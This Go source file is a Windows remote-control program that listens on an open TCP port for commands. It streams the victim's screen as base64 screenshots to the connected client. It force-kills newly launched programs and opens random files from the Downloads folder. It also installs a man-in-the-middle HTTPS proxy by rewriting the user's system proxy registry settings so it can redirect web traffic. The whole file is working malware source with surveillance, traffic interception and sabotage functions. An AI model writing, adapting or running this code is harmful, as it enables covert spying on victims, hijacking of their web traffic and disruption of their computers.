package main

import (
	"bufio"
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"github.com/AdguardTeam/gomitmproxy"
	"github.com/AdguardTeam/gomitmproxy/mitm"
	"github.com/AdguardTeam/gomitmproxy/proxyutil"
	"github.com/mitchellh/go-ps"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	"image/jpeg"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// for redirect
type CustomCertsStorage struct {
	// certsCache is a cache with the generated certificates.
	certsCache map[string]*tls.Certificate
}

func (c *CustomCertsStorage) Get(key string) (cert *tls.Certificate, ok bool) {
	cert, ok = c.certsCache[key]

	return cert, ok
}

// Set saves the certificate to the storage.
func (c *CustomCertsStorage) Set(key string, cert *tls.Certificate) {
	c.certsCache[key] = cert
}

var runningClose = false
var runningRedirect = false
var stopRedirect1 = false

func sendImages(conn net.Conn) {
	for {
		img, err := screenshot.CaptureScreen()
		if err != nil {
			log.Println(err)
			continue
		}
		buf := new(bytes.Buffer)
		err = jpeg.Encode(buf, img, nil)
		if err != nil {
			log.Println(err)
			continue
		}
		encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
		_, err = conn.Write([]byte(encoded))
		if err != nil {
			log.Println(err)
			return
		}
		time.Sleep(time.Millisecond)
	}
}

func closeNewProcesses(stopClose chan bool) {
	//stopClose <- false
	programOpened := map[int]bool{}
	importantProcesses := map[string]bool{
		"explorer.exe":                true,
		"powershell.exe":              true,
		"svchost.exe":                 true,
		"wininit.exe":                 true,
		"winlogon.exe":                true,
		"lsass.exe":                   true,
		"services.exe":                true,
		"csrss.exe":                   true,
		"smss.exe":                    true,
		"System":                      true,
		"Registry":                    true,
		"System Idle":                 true,
		"System Interrupts":           true,
		"System Task":                 true,
		"goland64.exe":                true,
		"gofmt.exe":                   true,
		"git.exe":                     true,
		"taskkill.exe":                true,
		"conhost.exe":                 true,
		"dllhost.exe":                 true,
		"cmd.exe":                     true,
		"OpenWith.exe":                true,
		"consent.exe":                 true,
		"msiexec.exe":                 true,
		"SearchProtocolHost.exe":      true,
		"mchost.exe":                  true,
		"RuntimeBroker.exe":           true,
		"ApplicationFrameHost.exe":    true,
		"ShellExperienceHost.exe":     true,
		"StartMenuExperienceHost.exe": true,
		"backgroundTaskHost.exe":      true,
		"smartscreen.exe":             true,
		"WmiPrvSE.exe":                true,
		"runnerw.exe":                 true,
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	downloadsDir := filepath.Join(homeDir, "Downloads")

	fmt.Println(downloadsDir)

	files, err := ioutil.ReadDir(downloadsDir)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}
	// Get a list of all processes running on the system
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println("Error getting processes: ", err)
		return
	}

	// Loop continuously to detect new processes
	for {
		select {
		case <-stopClose:
			// Stop the loop when the stop channel receives a signal
			fmt.Println("Closing function stopped")
			return
		default:
			newProcesses, err := ps.Processes()
			if err != nil {
				fmt.Println("Error getting new processes: ", err)
				continue
			}

			// Compare the current list of processes with the new list
			for _, newProcess := range newProcesses {
				found := false
				for _, process := range processes {
					if newProcess.Pid() == process.Pid() {
						found = true
						break
					}
				}

				// If the process is not in the current list, it's new
				if !found {
					//fmt.Printf("New process detected: %dmd\t%s\n", newProcess.Pid(), newProcess.Executable())
					if !importantProcesses[newProcess.Executable()] && !programOpened[newProcess.Pid()] {
						go func() {
							kill := exec.Command("TASKKILL", "/T", "/F", "/IM", newProcess.Executable())
							//fmt.Println("TASKKILL", "/T", "/F", "/IM", newProcess.Executable(), newProcess.Pid())
							kill.Stderr = os.Stderr
							kill.Stdout = os.Stdout
							err := kill.Run()
							if err != nil {
								fmt.Println("kill error", newProcess.Executable(), err)
							}
							if err == nil {
								fmt.Println("killed: ", newProcess.Executable(), " ", newProcess.Pid())
								if len(files) == 0 {
									fmt.Println("No files found in Downloads directory")
									return
								}
								randomIndex := rand.Intn(len(files))
								randomFile := files[randomIndex]

								// Open the file.
								filePath := filepath.Join(downloadsDir, randomFile.Name())
								// open the file using the default program associated with it
								cmd := exec.Command("cmd", "/c", "start", filePath)
								err = cmd.Run()
								if err != nil {
									fmt.Println("Error opening file:", err)
									return
								}

								// Get the process ID of the program that opened the file.
								pid := cmd.Process.Pid
								fmt.Println(pid, " ", cmd.Process, " ", newProcess.Executable(), " ", newProcess.Pid())
								programOpened[pid] = true
							}

						}()
					} else {
						//fmt.Println("Process is important and will not be terminated.:", newProcess.Executable())
					}
				}
			}

			// Update the current list of processes
			processes = newProcesses

			// Sleep for a short interval before checking for new processes again
			time.Sleep(5 * time.Millisecond)
		}

	}
}

func redirect(source string, dest string) {
	// Read the MITM cert and key.
	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)

	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
	if err != nil {
		log.Fatal(err)
	}

	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
		certsCache: map[string]*tls.Certificate{}},
	)

	if err != nil {
		log.Fatal(err)
	}

	// Generate certs valid for 7 days.
	mitmConfig.SetValidity(time.Hour * 24 * 7)
	// Set certs organization.
	mitmConfig.SetOrganization("gomitmproxy")

	proxy := gomitmproxy.NewProxy(gomitmproxy.Config{
		ListenAddr: &net.TCPAddr{
			IP:   net.IPv4(0, 0, 0, 0),
			Port: 8080,
		},
		MITMConfig: mitmConfig,
		OnRequest: func(session *gomitmproxy.Session) (request *http.Request, response *http.Response) {
			req := session.Request()

			log.Printf("onRequest: %s %s", req.Method, req.URL.String())
			fmt.Println(req.URL.Host)
			if req.URL.Host == source {
				session.SetProp("blocked", true)
				redirectURL := dest
				resp, err := http.Get(redirectURL)
				if err != nil {
					log.Fatal(err)
				}
				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
				res.Header.Set("Content-Type", "text/html")
				res.Header.Set("Location", redirectURL)
				return nil, res
			} else if source == "all" {
				req.Close = true
				session.SetProp("blocked", true)
				redirectURL := dest
				resp, err := http.Get(redirectURL)
				if err != nil {
					log.Fatal(err)
				}
				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
				res.Header.Set("Content-Type", "text/html")
				res.Header.Set("Location", redirectURL)
				time.Sleep(1 * time.Second)
				return nil, res
			}
			return nil, nil
		},
		OnResponse: func(session *gomitmproxy.Session) *http.Response {
			log.Printf("onResponse: %s", session.Request().URL.String())

			if blocked, ok := session.GetProp("blocked"); ok && blocked.(bool) {
				log.Printf("onResponse: was blocked")
			}
			return session.Response()
		},
	})
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
	if err != nil {
		// Handle error
	}
	defer key.Close()

	// Set the proxy server and port
	err = key.SetStringValue("ProxyServer", "127.0.0.1:8080")
	if err != nil {
		// Handle error
	}

	// Enable the proxy server
	err = key.SetDWordValue("ProxyEnable", 1)
	if err != nil {
		// Handle error
	}

	fmt.Println("System proxy settings changed.")
	err = proxy.Start()
	if err != nil {
		log.Fatal(err)
	}

	for {
		if stopRedirect1 {
			err = key.SetDWordValue("ProxyEnable", 0)
			if err != nil {
				// Handle error
			}

			// Delete the proxy server
			err = key.DeleteValue("ProxyServer")
			if err != nil {
				// Handle error
			}

			fmt.Println("System proxy settings turned off.")
			proxy.Close()
			//Stop the loop when the stop channel receives a signal
			fmt.Println("Redirect function stopped")
			stopRedirect1 = false
			return
		}
	}
}

func stopClosing(stopClose chan bool) {
	// Send a signal to the stop channel to stop the closing function
	stopClose <- true
	time.Sleep(10 * time.Millisecond)
	runningClose = false
	return
}

func stopRedirecting() {
	// Send a signal to the stop channel to stop the redirect function
	fmt.Println("instop1")
	stopRedirect1 = true
	runningRedirect = false
	fmt.Println("instop2")
	return
}

func waitForStopClose(stopClose chan bool) {
	<-stopClose
}

func main() {
	// Start listening on port 9090
	listener, err := net.Listen("tcp", "0.0.0.0:9090")
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	// Create a stop channel
	stopClose := make(chan bool)
	go waitForStopClose(stopClose)

	// Loop forever and handle incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			panic(err)
		}
		go handleConnection(conn, stopClose)
	}
}

func handleConnection(conn net.Conn, stopClose chan bool) {
	defer conn.Close()

	// Create a map of commands to functions
	commands := map[string]func(args []string){
		"closing": func(args []string) {
			if !runningClose {
				runningClose = true
				go closeNewProcesses(stopClose)
			} else {
				fmt.Println("Function closing is already running")
			}
		},
		"redirect": func(args []string) {
			if !runningRedirect {
				if len(args) == 2 {
					go redirect(args[0], args[1])
				} else {
					go redirect("", "")
				}
				runningRedirect = true
			} else {
				fmt.Println("Function redirect is already running")
			}
		},
		"screen": func(args []string) {
			go sendImages(conn)
		},
		"stopClosing":  func(args []string) { stopClosing(stopClose) },
		"stopRedirect": func(args []string) { stopRedirecting() },
	}

	// Read commands from the client and execute the corresponding function
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		fmt.Println(command)
		parts := strings.Split(command, " ")
		if len(parts) > 0 {
			commandName := parts[0]
			commandArgs := parts[1:]
			if function, ok := commands[commandName]; ok {
				function(commandArgs)
			} else {
				fmt.Println("Unknown command:", command)
			}
		}
	}
	stopClosing(stopClose)
	stopRedirecting()

	runningClose = false
	runningRedirect = false
	stopRedirect1 = false

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
	if err != nil {
		// Handle error
	}
	defer key.Close()

	fmt.Println("System proxy settings changed.")
	// Client connection was closed
	fmt.Println("Connection closed by client.")
	err = key.SetDWordValue("ProxyEnable", 0)
	if err != nil {
		// Handle error
	}

	// Delete the proxy server
	err = key.DeleteValue("ProxyServer")
	if err != nil {
		// Handle error
	}

	fmt.Println("System proxy settings turned off.")
}
